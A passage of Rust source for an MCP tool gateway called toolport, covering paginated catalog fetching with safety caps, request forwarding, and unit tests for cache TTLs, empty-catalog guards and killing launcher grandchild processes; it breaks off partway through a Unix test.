        if self.prompt_cache_hint.needs_refresh() {
            self.refresh_prompts_inner();
        }
    }

    fn refresh_prompts_inner(&mut self) {
        if !self.caps_prompts {
            return;
        }
        self.transport.set_read_timeout(STDIO_CONNECT_TIMEOUT);
        match fetch_paginated_list(&mut *self.transport, "prompts/list", "prompts") {
            Ok(listed) if listed.warning.is_none() => {
                apply_catalog_refresh(
                    &mut self.prompts,
                    listed.items,
                    &mut self.empty_prompts_streak,
                    &mut self.prompt_cache_hint,
                    listed.cache_hint,
                    &self.id,
                    "prompt",
                );
            }
            Ok(listed) => {
                self.prompt_cache_hint.mark_stale_and_defer();
                eprintln!(
                    "toolport: keeping server '{}' previous prompt catalog after an incomplete refresh: {}",
                    self.id,
                    listed.warning.unwrap_or_default()
                );
            }
            Err(error) => {
                self.prompt_cache_hint.mark_stale_and_defer();
                eprintln!(
                    "toolport: keeping server '{}' previous prompt catalog after refresh failed: {error}",
                    self.id
                );
            }
        }
        self.transport.set_read_timeout(STDIO_READ_TIMEOUT);
    }

    /// Fetch the resources, resource templates, and prompts the server advertised.
    /// Best-effort: an error or empty response just leaves the list empty. Kept
    /// out of `connect` so only the gateway (which actually proxies these) pays
    /// the cost. Templates are loaded whenever the server advertised resources;
    /// a server that does not implement `resources/templates/list` simply leaves
    /// the template catalog empty.
    pub fn load_resources_prompts(&mut self) {
        if self.caps_resources {
            if let Ok(listed) =
                fetch_paginated_list(&mut *self.transport, "resources/list", "resources")
            {
                if let Some(warning) = &listed.warning {
                    eprintln!(
                        "toolport: server '{}' returned a partial resource catalog: {warning}",
                        self.id
                    );
                }
                self.resource_cache_hint = listed.cache_hint;
                self.resources = listed.items;
            }
            if let Ok(listed) = fetch_paginated_list(
                &mut *self.transport,
                "resources/templates/list",
                "resourceTemplates",
            ) {
                if let Some(warning) = &listed.warning {
                    eprintln!(
                        "toolport: server '{}' returned a partial resource-template catalog: {warning}",
                        self.id
                    );
                }
                self.resource_template_cache_hint = listed.cache_hint;
                self.resource_templates = listed.items;
            }
        }
        if self.caps_prompts {
            if let Ok(listed) =
                fetch_paginated_list(&mut *self.transport, "prompts/list", "prompts")
            {
                if let Some(warning) = &listed.warning {
                    eprintln!(
                        "toolport: server '{}' returned a partial prompt catalog: {warning}",
                        self.id
                    );
                }
                self.prompt_cache_hint = listed.cache_hint;
                self.prompts = listed.items;
            }
        }
    }

    pub fn call(&mut self, tool: &str, arguments: Value) -> Result<Value, TransportError> {
        self.call_with_cancel(tool, arguments, None, None)
    }

    /// `meta` is the upstream client's `params._meta`, relayed downstream minus
    /// the per-hop keys (SOU-444). `None` for calls Toolport originates itself,
    /// such as a code-mode script step, which have no client request behind them.
    pub fn call_with_cancel(
        &mut self,
        tool: &str,
        arguments: Value,
        cancel: Option<CancelContext>,
        meta: Option<&Value>,
    ) -> Result<Value, TransportError> {
        self.call_with_cancel_and_mrtr(tool, arguments, cancel, meta, None)
    }

    pub fn call_with_cancel_and_mrtr(
        &mut self,
        tool: &str,
        arguments: Value,
        cancel: Option<CancelContext>,
        meta: Option<&Value>,
        mrtr: Option<&MrtrRequest>,
    ) -> Result<Value, TransportError> {
        let headers = if self.modern_http {
            tool_request_headers(&self.tools, tool, &arguments)?
        } else {
            Vec::new()
        };
        self.request_with_mrtr(
            "tools/call",
            json!({ "name": tool, "arguments": arguments }),
            cancel,
            meta,
            mrtr,
            &headers,
        )
    }

    /// Read one resource by its (original, downstream) uri.
    pub fn read_resource(&mut self, uri: &str) -> Result<Value, TransportError> {
        self.read_resource_with_cancel(uri, None, None)
    }

    pub fn read_resource_with_cancel(
        &mut self,
        uri: &str,
        cancel: Option<CancelContext>,
        meta: Option<&Value>,
    ) -> Result<Value, TransportError> {
        self.read_resource_with_cancel_and_mrtr(uri, cancel, meta, None)
    }

    pub fn read_resource_with_cancel_and_mrtr(
        &mut self,
        uri: &str,
        cancel: Option<CancelContext>,
        meta: Option<&Value>,
        mrtr: Option<&MrtrRequest>,
    ) -> Result<Value, TransportError> {
        self.request_with_mrtr(
            "resources/read",
            json!({ "uri": uri }),
            cancel,
            meta,
            mrtr,
            &[],
        )
    }

    /// Subscribe to `notifications/resources/updated` for one resource URI on
    /// this downstream (SOU-394). The gateway only calls this when at least one
    /// upstream client is subscribed to the same URI.
    pub fn subscribe_resource(&mut self, uri: &str) -> Result<Value, TransportError> {
        if matches!(self.era, Era::Modern { .. }) {
            if self.modern_resource_subscriptions.insert(uri.to_string()) {
                let mut resource_subscriptions: Vec<String> =
                    self.modern_resource_subscriptions.iter().cloned().collect();
                resource_subscriptions.sort();
                if let Err(error) = self.transport.set_subscription_listener(SubscriptionFilter {
                    tools_list_changed: true,
                    prompts_list_changed: self.caps_prompts,
                    resources_list_changed: self.caps_resources,
                    resource_subscriptions,
                }) {
                    self.modern_resource_subscriptions.remove(uri);
                    return Err(error);
                }
            }
            return Ok(json!({}));
        }
        self.transport.request("resources/subscribe", json!({ "uri": uri }))
    }

    /// Drop a previously established downstream resource subscription.
    pub fn unsubscribe_resource(&mut self, uri: &str) -> Result<Value, TransportError> {
        if matches!(self.era, Era::Modern { .. }) {
            if self.modern_resource_subscriptions.remove(uri) {
                let mut resource_subscriptions: Vec<String> =
                    self.modern_resource_subscriptions.iter().cloned().collect();
                resource_subscriptions.sort();
                if let Err(error) = self.transport.set_subscription_listener(SubscriptionFilter {
                    tools_list_changed: true,
                    prompts_list_changed: self.caps_prompts,
                    resources_list_changed: self.caps_resources,
                    resource_subscriptions,
                }) {
                    self.modern_resource_subscriptions.insert(uri.to_string());
                    return Err(error);
                }
            }
            return Ok(json!({}));
        }
        self.transport
            .request("resources/unsubscribe", json!({ "uri": uri }))
    }

    /// Get one prompt by its (original, downstream) name.
    pub fn get_prompt(&mut self, name: &str, arguments: Value) -> Result<Value, TransportError> {
        self.get_prompt_with_cancel(name, arguments, None, None)
    }

    pub fn get_prompt_with_cancel(
        &mut self,
        name: &str,
        arguments: Value,
        cancel: Option<CancelContext>,
        meta: Option<&Value>,
    ) -> Result<Value, TransportError> {
        self.get_prompt_with_cancel_and_mrtr(name, arguments, cancel, meta, None)
    }

    pub fn get_prompt_with_cancel_and_mrtr(
        &mut self,
        name: &str,
        arguments: Value,
        cancel: Option<CancelContext>,
        meta: Option<&Value>,
        mrtr: Option<&MrtrRequest>,
    ) -> Result<Value, TransportError> {
        self.request_with_mrtr(
            "prompts/get",
            json!({ "name": name, "arguments": arguments }),
            cancel,
            meta,
            mrtr,
            &[],
        )
    }

    /// Whether this server advertised the completions utility at initialize.
    pub fn supports_completions(&self) -> bool {
        self.caps_completions
    }

    pub fn tool_cache_hint(&self) -> CacheHint {
        self.tool_cache_hint
    }

    pub fn resource_cache_hint(&self) -> Option<CacheHint> {
        self.caps_resources.then_some(self.resource_cache_hint)
    }

    pub fn resource_template_cache_hint(&self) -> Option<CacheHint> {
        self.caps_resources
            .then_some(self.resource_template_cache_hint)
    }

    pub fn prompt_cache_hint(&self) -> Option<CacheHint> {
        self.caps_prompts.then_some(self.prompt_cache_hint)
    }

    /// Extension capability settings from a modern `server/discover` response.
    pub fn extensions(&self) -> &serde_json::Map<String, Value> {
        &self.caps_extensions
    }

    /// Forward a Tasks extension request on the same modern hop as the call
    /// that created it. The router has already translated the client-facing
    /// task id back to the server's native id.
    pub fn task_request(
        &mut self,
        method: &str,
        params: Value,
        cancel: Option<CancelContext>,
        meta: Option<&Value>,
    ) -> Result<Value, TransportError> {
        if !self.caps_extensions.contains_key("io.modelcontextprotocol/tasks") {
            return Err(TransportError::Fatal(format!(
                "server '{}' did not advertise io.modelcontextprotocol/tasks",
                self.id
            )));
        }
        self.request_with_mrtr(method, params, cancel, meta, None, &[])
    }

    /// The protocol era and version this connection negotiated (SOU-445).
    pub fn era(&self) -> &Era {
        &self.era
    }

    /// Forward a `completion/complete` request. `params` must already use the
    /// downstream's native reference names (prompt names un-namespaced).
    pub fn complete(&mut self, params: Value) -> Result<Value, TransportError> {
        self.complete_with_cancel(params, None)
    }

    pub fn complete_with_cancel(
        &mut self,
        mut params: Value,
        cancel: Option<CancelContext>,
    ) -> Result<Value, TransportError> {
        let original_meta = params.get("_meta").cloned();
        sanitize_forwarded_meta(&mut params);
        if matches!(self.era, Era::Modern { .. }) {
            attach_client_extensions(&mut params, original_meta.as_ref());
        }
        self.transport
            .request_with_cancel("completion/complete", params, cancel)
    }

    /// Forward a JSON-RPC notification to this downstream server.
    pub fn notify_downstream(&mut self, method: &str, params: Value) -> Result<(), TransportError> {
        self.transport.notify(method, params)
    }
}

/// Pull a named array field out of a JSON-RPC result, or an empty vec.
fn extract_array(result: &Value, key: &str) -> Vec<Value> {
    result
        .get(key)
        .and_then(|v| v.as_array())
        .cloned()
        .unwrap_or_default()
}

struct PaginatedList {
    items: Vec<Value>,
    /// Minimum remaining TTL and most-private scope across every page. A partial
    /// traversal is always reset to the conservative zero/private policy.
    cache_hint: CacheHint,
    /// Present when at least one page succeeded but traversal could not finish.
    /// Initial discovery may expose that useful prefix; refreshes keep the prior
    /// complete snapshot instead of replacing it with a partial catalog.
    warning: Option<String>,
}

/// Traverse one MCP list operation using its opaque `nextCursor`. The first page
/// remains mandatory. Once at least one page has succeeded, a later failure is
/// returned as a partial result so a server stays usable during initial discovery.
/// Cursor loops and excessive page/item counts are bounded defensively.
fn fetch_paginated_list(
    transport: &mut dyn Transport,
    method: &str,
    key: &str,
) -> Result<PaginatedList, TransportError> {
    let mut items = Vec::new();
    let mut cursor: Option<String> = None;
    let mut seen_cursors = HashSet::new();
    let started = Instant::now();
    let mut cache_hint: Option<CacheHint> = None;

    for page_index in 0..MAX_LIST_PAGES {
        if page_index > 0 && started.elapsed() >= MAX_LIST_DURATION {
            return Ok(PaginatedList {
                items,
                cache_hint: CacheHint::default(),
                warning: Some(format!(
                    "catalog traversal exceeded the {}-second safety cap",
                    MAX_LIST_DURATION.as_secs()
                )),
            });
        }
        let params = cursor
            .as_ref()
            .map_or_else(|| json!({}), |value| json!({ "cursor": value }));
        let result = match transport.request(method, params) {
            Ok(result) => result,
            Err(error) if page_index > 0 => {
                return Ok(PaginatedList {
                    items,
                    cache_hint: CacheHint::default(),
                    warning: Some(format!("page {} failed: {error}", page_index + 1)),
                });
            }
            Err(error) => return Err(error),
        };

        let page_hint = CacheHint::from_result(&result);
        cache_hint = Some(match cache_hint {
            Some(current) => current.merge(page_hint),
            None => page_hint,
        });

        let page = extract_array(&result, key);
        let remaining = MAX_LIST_ITEMS.saturating_sub(items.len());
        if page.len() > remaining {
            items.extend(page.into_iter().take(remaining));
            return Ok(PaginatedList {
                items,
                cache_hint: CacheHint::default(),
                warning: Some(format!("catalog exceeded the {MAX_LIST_ITEMS}-item safety cap")),
            });
        }
        items.extend(page);

        let Some(next_cursor) = result
            .get("nextCursor")
            .and_then(Value::as_str)
            .map(str::to_string)
        else {
            return Ok(PaginatedList {
                items,
                cache_hint: cache_hint.unwrap_or_default(),
                warning: None,
            });
        };
        if !seen_cursors.insert(next_cursor.clone()) {
            return Ok(PaginatedList {
                items,
                cache_hint: CacheHint::default(),
                warning: Some("server repeated a pagination cursor".to_string()),
            });
        }
        cursor = Some(next_cursor);
    }

    Ok(PaginatedList {
        items,
        cache_hint: CacheHint::default(),
        warning: Some(format!("catalog exceeded the {MAX_LIST_PAGES}-page safety cap")),
    })
}

#[cfg(test)]
mod tests {
    use super::{
        cwd_validation_error, empty_cwd_variables, expand_cwd, file_uri_to_path, resolve_command,
        resolve_root_token, screen_resolved_addrs, screen_spawn_command, screen_spawn_env,
        validate_cwd, CacheHint, CancelRegistry, DownstreamServer, MrtrRequest, ServerRequestAction,
        ServerRequestHandler, Transport, TransportError, MODERN_PROTOCOL_VERSION,
        fetch_paginated_list, protocol_meta_for, HttpTransport,
        OAUTH_CLIENT_CREDENTIALS_EXTENSION,
    };
    use serde_json::{json, Value};
    use std::collections::{HashMap, VecDeque};
    use std::path::Path;
    use std::sync::{Arc, Mutex};

    struct MrtrTransport {
        responses: VecDeque<Result<Value, TransportError>>,
        requests: Arc<Mutex<Vec<(String, Value)>>>,
    }

    impl MrtrTransport {
        fn modern(
            call_responses: Vec<Result<Value, TransportError>>,
        ) -> (Self, Arc<Mutex<Vec<(String, Value)>>>) {
            let requests = Arc::new(Mutex::new(Vec::new()));
            let mut responses = VecDeque::from([
                Err(TransportError::Rpc(json!({
                    "code": -32601,
                    "message": "initialize removed"
                }))),
                Ok(json!({
                    "supportedVersions": [MODERN_PROTOCOL_VERSION],
                    "capabilities": {}
                })),
                Ok(json!({
                    "tools": [{
                        "name": "echo",
                        "description": "fixture",
                        "inputSchema": { "type": "object" }
                    }]
                })),
            ]);
            responses.extend(call_responses);
            (
                Self {
                    responses,
                    requests: Arc::clone(&requests),
                },
                requests,
            )
        }
    }

    impl Transport for MrtrTransport {
        fn request(
            &mut self,
            method: &str,
            params: Value,
        ) -> Result<Value, TransportError> {
            self.requests
                .lock()
                .unwrap()
                .push((method.to_string(), params));
            self.responses
                .pop_front()
                .expect("scripted MRTR response")
        }

        fn notify(&mut self, _method: &str, _params: Value) -> Result<(), TransportError> {
            Ok(())
        }
    }

    struct PaginationTransport {
        responses: VecDeque<Result<Value, TransportError>>,
        params: Vec<Value>,
    }

    impl PaginationTransport {
        fn new(responses: Vec<Result<Value, TransportError>>) -> Self {
            Self {
                responses: responses.into(),
                params: Vec::new(),
            }
        }
    }

    impl Transport for PaginationTransport {
        fn request(&mut self, _method: &str, params: Value) -> Result<Value, TransportError> {
            self.params.push(params);
            self.responses
                .pop_front()
                .expect("pagination test supplied a response")
        }

        fn notify(&mut self, _method: &str, _params: Value) -> Result<(), TransportError> {
            Ok(())
        }
    }

    #[test]
    fn paginated_list_collects_every_page_and_treats_empty_cursor_as_opaque() {
        let mut transport = PaginationTransport::new(vec![
            Ok(json!({"tools":[{"name":"a"}],"nextCursor":""})),
            Ok(json!({"tools":[{"name":"b"}],"nextCursor":"page-3"})),
            Ok(json!({"tools":[{"name":"c"}]})),
        ]);
        let listed = fetch_paginated_list(&mut transport, "tools/list", "tools").unwrap();
        assert!(listed.warning.is_none());
        assert_eq!(
            listed
                .items
                .iter()
                .filter_map(|item| item["name"].as_str())
                .collect::<Vec<_>>(),
            vec!["a", "b", "c"]
        );
        assert_eq!(
            transport.params,
            vec![json!({}), json!({"cursor":""}), json!({"cursor":"page-3"})]
        );
    }

    #[test]
    fn paginated_list_uses_the_shortest_ttl_and_most_private_scope() {
        let mut transport = PaginationTransport::new(vec![
            Ok(json!({
                "tools": [{"name":"a"}],
                "nextCursor": "two",
                "ttlMs": 60_000,
                "cacheScope": "public"
            })),
            Ok(json!({
                "tools": [{"name":"b"}],
                "ttlMs": 30_000,
                "cacheScope": "private"
            })),
        ]);
        let listed = fetch_paginated_list(&mut transport, "tools/list", "tools").unwrap();
        assert_eq!(listed.items.len(), 2);
        assert!(!listed.cache_hint.is_public());
        let ttl = listed.cache_hint.remaining_ttl_ms();
        assert!(ttl > 0 && ttl <= 30_000, "minimum page TTL should win: {ttl}");
    }

    #[test]
    fn oversized_cache_ttl_is_handled_without_panicking() {
        let downstream = CacheHint::from_result(&json!({
            "ttlMs": u64::MAX,
            "cacheScope": "public"
        }));
        let _ = downstream.remaining_ttl_ms();
        let _ = CacheHint::local(u64::MAX).remaining_ttl_ms();
    }

    #[test]
    fn positive_ttl_refreshes_once_stale_but_zero_ttl_does_not_poll() {
        let expiring = PaginationTransport::new(vec![
            Ok(json!({ "capabilities": {} })),
            Ok(json!({
                "tools": [{"name":"old"}],
                "ttlMs": 5,
                "cacheScope": "public"
            })),
            Ok(json!({
                "tools": [{"name":"fresh"}],
                "ttlMs": 60_000,
                "cacheScope": "public"
            })),
        ]);
        let mut server = DownstreamServer::connect("ttl".to_string(), Box::new(expiring)).unwrap();
        std::thread::sleep(std::time::Duration::from_millis(15));
        server.refresh_tools_if_stale();
        assert_eq!(server.tools[0]["name"], "fresh");

        // No third scripted response: this panics if zero/missing TTL turns the
        // one-second watcher into an unbounded polling loop.
        let zero = PaginationTransport::new(vec![
            Ok(json!({ "capabilities": {} })),
            Ok(json!({
                "tools": [{"name":"stable"}],
                "ttlMs": 0,
                "cacheScope": "private"
            })),
        ]);
        let mut server = DownstreamServer::connect("zero".to_string(), Box::new(zero)).unwrap();
        server.refresh_tools_if_stale();
        assert_eq!(server.tools[0]["name"], "stable");
    }

    #[test]
    fn paginated_list_stops_on_a_repeated_cursor() {
        let mut transport = PaginationTransport::new(vec![
            Ok(json!({"resources":[{"uri":"one:"}],"nextCursor":"same"})),
            Ok(json!({"resources":[{"uri":"two:"}],"nextCursor":"same"})),
        ]);
        let listed =
            fetch_paginated_list(&mut transport, "resources/list", "resources").unwrap();
        assert_eq!(listed.items.len(), 2);
        assert_eq!(
            listed.warning.as_deref(),
            Some("server repeated a pagination cursor")
        );
    }

    #[test]
    fn downstream_server_loads_all_tool_resource_and_prompt_pages() {
        let transport = PaginationTransport::new(vec![
            Ok(json!({
                "capabilities": { "resources": {}, "prompts": {}, "completions": {} }
            })),
            Ok(json!({"tools":[{"name":"one"}],"nextCursor":"tools-2"})),
            Ok(json!({"tools":[{"name":"two"}]})),
            Ok(json!({"resources":[{"uri":"one:"}],"nextCursor":"resources-2"})),
            Ok(json!({"resources":[{"uri":"two:"}]})),
            Ok(json!({"resourceTemplates":[{"uriTemplate":"one://{id}"}],"nextCursor":"templates-2"})),
            Ok(json!({"resourceTemplates":[{"uriTemplate":"two://{id}"}]})),
            Ok(json!({"prompts":[{"name":"one"}],"nextCursor":"prompts-2"})),
            Ok(json!({"prompts":[{"name":"two"}]})),
        ]);
        let mut server =
            DownstreamServer::connect("fixture".to_string(), Box::new(transport)).unwrap();
        server.load_resources_prompts();
        assert_eq!(server.tools.len(), 2);
        assert_eq!(server.resources.len(), 2);
        assert_eq!(server.resource_templates.len(), 2);
        assert_eq!(server.prompts.len(), 2);
        assert!(server.supports_completions());
        assert_eq!(server.tools[1]["name"], "two");
        assert_eq!(server.resources[1]["uri"], "two:");
        assert_eq!(server.resource_templates[1]["uriTemplate"], "two://{id}");
        assert_eq!(server.prompts[1]["name"], "two");
    }

    #[test]
    fn incomplete_refresh_keeps_the_previous_complete_catalog() {
        let transport = PaginationTransport::new(vec![
            Ok(json!({"tools":[{"name":"partial"}],"nextCursor":"two"})),
            Err(TransportError::Unavailable("page two timed out".to_string())),
        ]);
        let mut server = DownstreamServer {
            id: "fixture".to_string(),
            transport: Box::new(transport),
            tools: vec![json!({"name":"stable"})],
            resources: Vec::new(),
            resource_templates: Vec::new(),
            prompts: Vec::new(),
            tool_cache_hint: CacheHint::default(),
            resource_cache_hint: CacheHint::default(),
            resource_template_cache_hint: CacheHint::default(),
            prompt_cache_hint: CacheHint::default(),
            empty_tools_streak: 0,
            empty_resources_streak: 0,
            empty_templates_streak: 0,
            empty_prompts_streak: 0,
            caps_resources: false,
            caps_prompts: false,
            caps_completions: false,
            caps_extensions: serde_json::Map::new(),
            era: super::Era::Legacy { version: super::PROTOCOL_VERSION.to_string() },
            modern_http: false,
            modern_resource_subscriptions: std::collections::HashSet::new(),
            server_handler: None,
        };
        server.refresh_tools();
        assert_eq!(server.tools, vec![json!({"name":"stable"})]);
    }

    /// SOU-338: a single successful empty tools/list must not wipe a non-empty catalog.
    /// Mutation check: remove the empty-success guard and this fails.
    #[test]
    fn empty_successful_tool_refresh_keeps_previous_catalog() {
        let transport = PaginationTransport::new(vec![Ok(json!({ "tools": [] }))]);
        let mut server = DownstreamServer {
            id: "fixture".to_string(),
            transport: Box::new(transport),
            tools: vec![json!({"name":"stable"})],
            resources: Vec::new(),
            resource_templates: Vec::new(),
            prompts: Vec::new(),
            tool_cache_hint: CacheHint::default(),
            resource_cache_hint: CacheHint::default(),
            resource_template_cache_hint: CacheHint::default(),
            prompt_cache_hint: CacheHint::default(),
            empty_tools_streak: 0,
            empty_resources_streak: 0,
            empty_templates_streak: 0,
            empty_prompts_streak: 0,
            caps_resources: false,
            caps_prompts: false,
            caps_completions: false,
            caps_extensions: serde_json::Map::new(),
            era: super::Era::Legacy {
                version: super::PROTOCOL_VERSION.to_string(),
            },
            modern_http: false,
            modern_resource_subscriptions: std::collections::HashSet::new(),
            server_handler: None,
        };
        server.refresh_tools();
        assert_eq!(
            server.tools,
            vec![json!({"name":"stable"})],
            "first successful empty list must not wipe prior tools"
        );
        assert_eq!(server.empty_tools_streak, 1);
    }

    /// CodeRev on #629 / SOU-338: two consecutive empty successes accept the wipe
    /// so legitimate full revocation is not stuck forever behind the guard.
    #[test]
    fn two_consecutive_empty_tool_refreshes_accept_wipe() {
        let transport = PaginationTransport::new(vec![
            Ok(json!({ "tools": [] })),
            Ok(json!({ "tools": [] })),
        ]);
        let mut server = DownstreamServer {
            id: "fixture".to_string(),
            transport: Box::new(transport),
            tools: vec![json!({"name":"stable"})],
            resources: Vec::new(),
            resource_templates: Vec::new(),
            prompts: Vec::new(),
            tool_cache_hint: CacheHint::default(),
            resource_cache_hint: CacheHint::default(),
            resource_template_cache_hint: CacheHint::default(),
            prompt_cache_hint: CacheHint::default(),
            empty_tools_streak: 0,
            empty_resources_streak: 0,
            empty_templates_streak: 0,
            empty_prompts_streak: 0,
            caps_resources: false,
            caps_prompts: false,
            caps_completions: false,
            caps_extensions: serde_json::Map::new(),
            era: super::Era::Legacy {
                version: super::PROTOCOL_VERSION.to_string(),
            },
            modern_http: false,
            modern_resource_subscriptions: std::collections::HashSet::new(),
            server_handler: None,
        };
        server.refresh_tools();
        assert_eq!(server.tools, vec![json!({"name":"stable"})]);
        server.refresh_tools();
        assert!(
            server.tools.is_empty(),
            "second consecutive empty success must accept the wipe"
        );
        assert_eq!(server.empty_tools_streak, 0);
    }

    /// SOU-338: empty success is allowed when the catalog was already empty
    /// (first-time empty, or intentionally emptied after a real full wipe path).
    #[test]
    fn empty_successful_tool_refresh_ok_when_already_empty() {
        let transport = PaginationTransport::new(vec![Ok(json!({ "tools": [] }))]);
        let mut server = DownstreamServer {
            id: "fixture".to_string(),
            transport: Box::new(transport),
            tools: Vec::new(),
            resources: Vec::new(),
            resource_templates: Vec::new(),
            prompts: Vec::new(),
            tool_cache_hint: CacheHint::default(),
            resource_cache_hint: CacheHint::default(),
            resource_template_cache_hint: CacheHint::default(),
            prompt_cache_hint: CacheHint::default(),
            empty_tools_streak: 0,
            empty_resources_streak: 0,
            empty_templates_streak: 0,
            empty_prompts_streak: 0,
            caps_resources: false,
            caps_prompts: false,
            caps_completions: false,
            caps_extensions: serde_json::Map::new(),
            era: super::Era::Legacy {
                version: super::PROTOCOL_VERSION.to_string(),
            },
            modern_http: false,
            modern_resource_subscriptions: std::collections::HashSet::new(),
            server_handler: None,
        };
        server.refresh_tools();
        assert!(server.tools.is_empty());
    }

    /// SOU-338: resources and prompts share the empty-success guard.
    #[test]
    fn empty_successful_resource_and_prompt_refresh_keeps_previous() {
        let transport = PaginationTransport::new(vec![
            Ok(json!({ "resources": [] })),
            Ok(json!({ "resourceTemplates": [] })),
            Ok(json!({ "prompts": [] })),
        ]);
        let mut server = DownstreamServer {
            id: "fixture".to_string(),
            transport: Box::new(transport),
            tools: Vec::new(),
            resources: vec![json!({"uri":"stable-r:"})],
            resource_templates: vec![json!({"uriTemplate":"stable://{id}"})],
            prompts: vec![json!({"name":"stable-p"})],
            tool_cache_hint: CacheHint::default(),
            resource_cache_hint: CacheHint::default(),
            resource_template_cache_hint: CacheHint::default(),
            prompt_cache_hint: CacheHint::default(),
            empty_tools_streak: 0,
            empty_resources_streak: 0,
            empty_templates_streak: 0,
            empty_prompts_streak: 0,
            caps_resources: true,
            caps_prompts: true,
            caps_completions: false,
            caps_extensions: serde_json::Map::new(),
            era: super::Era::Legacy {
                version: super::PROTOCOL_VERSION.to_string(),
            },
            modern_http: false,
            modern_resource_subscriptions: std::collections::HashSet::new(),
            server_handler: None,
        };
        server.refresh_resources();
        server.refresh_prompts();
        assert_eq!(server.resources, vec![json!({"uri":"stable-r:"})]);
        assert_eq!(
            server.resource_templates,
            vec![json!({"uriTemplate":"stable://{id}"})]
        );
        assert_eq!(server.prompts, vec![json!({"name":"stable-p"})]);
    }

    #[test]
    fn incomplete_template_refresh_keeps_the_previous_complete_catalog() {
        // resources/list succeeds fully, but templates pagination is incomplete:
        // keep the prior template snapshot rather than replacing it with a partial.
        let transport = PaginationTransport::new(vec![
            Ok(json!({"resources":[{"uri":"r:"}]})),
            Ok(json!({"resourceTemplates":[{"uriTemplate":"partial://{id}"}],"nextCursor":"two"})),
            Err(TransportError::Unavailable("page two timed out".to_string())),
        ]);
        let mut server = DownstreamServer {
            id: "fixture".to_string(),
            transport: Box::new(transport),
            tools: Vec::new(),
            resources: vec![json!({"uri":"stable-r:"})],
            resource_templates: vec![json!({"uriTemplate":"stable://{id}"})],
            prompts: Vec::new(),
            tool_cache_hint: CacheHint::default(),
            resource_cache_hint: CacheHint::default(),
            resource_template_cache_hint: CacheHint::default(),
            prompt_cache_hint: CacheHint::default(),
            empty_tools_streak: 0,
            empty_resources_streak: 0,
            empty_templates_streak: 0,
            empty_prompts_streak: 0,
            caps_resources: true,
            caps_prompts: false,
            caps_completions: false,
            caps_extensions: serde_json::Map::new(),
            era: super::Era::Legacy { version: super::PROTOCOL_VERSION.to_string() },
            modern_http: false,
            modern_resource_subscriptions: std::collections::HashSet::new(),
            server_handler: None,
        };
        server.refresh_resources();
        assert_eq!(server.resources, vec![json!({"uri":"r:"})]);
        assert_eq!(
            server.resource_templates,
            vec![json!({"uriTemplate":"stable://{id}"})]
        );
    }

    /// Minimal FFI for getpgrp (test-only, avoids adding libc as a dependency).
    #[cfg(unix)]
    unsafe fn libc_getpgrp() -> i32 {
        extern "C" {
            fn getpgrp() -> i32;
        }
        getpgrp()
    }

    /// Minimal FFI for getpgid (test-only, avoids adding libc as a dependency).
    #[cfg(unix)]
    unsafe fn libc_getpgid(pid: i32) -> i32 {
        extern "C" {
            fn getpgid(pid: i32) -> i32;
        }
        getpgid(pid)
    }

    #[cfg(windows)]
    #[test]
    fn windows_job_terminates_launcher_grandchild() {
        use super::StdioTransport;
        use std::time::{Duration, Instant, SystemTime, UNIX_EPOCH};
        use windows_sys::Win32::Foundation::{CloseHandle, WAIT_TIMEOUT};
        use windows_sys::Win32::System::Threading::{
            OpenProcess, WaitForSingleObject, PROCESS_SYNCHRONIZE,
        };

        fn process_is_running(pid: u32) -> bool {
            // SAFETY: OpenProcess returns an owned handle for this check. It is
            // always closed before returning.
            unsafe {
                let handle = OpenProcess(PROCESS_SYNCHRONIZE, 0, pid);
                if handle.is_null() {
                    return false;
                }
                let state = WaitForSingleObject(handle, 0);
                let _ = CloseHandle(handle);
                state == WAIT_TIMEOUT
            }
        }

        let nonce = SystemTime::now()
            .duration_since(UNIX_EPOCH)
            .unwrap()
            .as_nanos();
        let pid_file = std::env::temp_dir().join(format!(
            "toolport-job-test-{}-{nonce}.pid",
            std::process::id()
        ));
        let script_file = pid_file.with_extension("ps1");
        let escaped_pid_file = pid_file.to_string_lossy().replace('\'', "''");
        // The parent launches its descendant immediately. The production spawn
        // path must assign the suspended parent before allowing this code to run.
        let script = format!(
            "$grandchild = Start-Process -FilePath 'powershell.exe' \
               -ArgumentList @('-NoLogo','-NoProfile','-NonInteractive','-Command','Start-Sleep -Seconds 60') \
               -WindowStyle Hidden -PassThru; \
             [System.IO.File]::WriteAllText('{escaped_pid_file}', [string]$grandchild.Id); \
             Wait-Process -Id $grandchild.Id"
        );
        std::fs::write(&script_file, script).expect("write launcher script");
        let args = vec![
            "-NoLogo".to_string(),
            "-NoProfile".to_string(),
            "-NonInteractive".to_string(),
            "-ExecutionPolicy".to_string(),
            "Bypass".to_string(),
            "-File".to_string(),
            script_file.to_string_lossy().into_owned(),
        ];
        let transport = StdioTransport::spawn("powershell.exe", &args, &[], None)
            .expect("spawn Job Object-owned launcher");

        let created_deadline = Instant::now() + Duration::from_secs(8);
        while !pid_file.exists() && Instant::now() < created_deadline {
            std::thread::sleep(Duration::from_millis(25));
        }
        let grandchild_pid: u32 = std::fs::read_to_string(&pid_file)
            .expect("launcher should record its grandchild pid")
            .trim()
            .parse()
            .expect("grandchild pid should be numeric");
        assert!(
            process_is_running(grandchild_pid),
            "grandchild must be alive before the Job Object closes"
        );

        drop(transport);
        let exit_deadline = Instant::now() + Duration::from_secs(5);
        while process_is_running(grandchild_pid) && Instant::now() < exit_deadline {
            std::thread::sleep(Duration::from_millis(25));
        }
        assert!(
            !process_is_running(grandchild_pid),
            "closing the Job Object must terminate launcher descendants"
        );
        let _ = std::fs::remove_file(pid_file);
        let _ = std::fs::remove_file(script_file);
    }

    /// The unix counterpart to `windows_job_terminates_launcher_grandchild`:
    /// dropping the transport must kill the grandchild a launcher spawned, not
    /// just the launcher itself. Without the process-group kill the grandchild
    /// survives, which is the `npx`->node leak this guards against.
    #[cfg(unix)]
    #[test]
    fn dropping_transport_kills_launcher_grandchild() {
        use super::StdioTransport;
        use std::time::{Duration, Instant, SystemTime, UNIX_EPOCH};

        // Signal 0 probes for existence without delivering anything. A zombie
        // still answers, but the grandchild is reparented to init rather than
        // to us, so it is reaped promptly and never lingers as one here.
        fn process_is_running(pid: i32) -> bool {
            extern "C" {
                fn kill(pid: i32, sig: i32) -> i32;
            }
            // SAFETY: signal 0 performs the permission/existence check only.
            unsafe { kill(pid, 0) == 0 }
        }

        let nonce = SystemTime::now()
            .duration_since(UNIX_EPOCH)
            .unwrap()
            .as_nanos();
        let pid_file = std::env::temp_dir().join(format!(
            "toolport-pgroup-test-{}-{nonce}.pid",
            std::process::id()
        ));
        // `sh` stands in for a launcher: it starts a long-lived descendant,
        // records that pid, and then waits on it the way npx waits on node.
